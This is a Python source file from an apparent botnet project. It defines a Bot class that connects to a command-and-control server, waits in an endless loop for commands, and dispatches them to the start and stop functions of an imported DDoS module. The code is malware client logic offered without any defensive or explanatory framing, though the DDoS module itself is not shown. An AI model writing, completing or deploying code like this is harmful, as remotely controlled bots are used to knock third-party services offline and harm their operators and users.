'''
Created on Dec 20, 2013

@author: Onur
'''

from CommandParser import CommandParser
from modules.DDoSModule import DDoSModule

class Bot(object):
    """ Manages bot's operations
    
        The class is responsible for waiting commands from 
        the C&C and calling corresponding modules.
        
        Attributes:
            __client: A client object to connect to server.
            __modules: Runnable feature modules list which extends
                the FeatureModule.
    """
    
    __client = None
    __modules = None

    def __init__(self, client):
        """ Initializes with a client object and add feature module
            objects to the modules dictionary."""
        self.__client = client
        ddos = DDoSModule()
        self.__modules = {1:ddos.start,
                          2:ddos.stop}        
        
    def runCommand(self, cmd):
        """ Calls the module's start method with the right code.
            Passes it's arguments if there are any."""
        self.__modules[int(cmd[0])](cmd[1:])
    
    def activate(self):
        """ Connects to the C&C an infinitely waits for incoming commands.
            Calls parseCommand and runCommand methods sequentially for every
            command."""
        self.__client.connect()
        while True:
            cmd = self.__client.waitForCommand()
            print cmd            
            self.runCommand(CommandParser.parseCommand(cmd))
        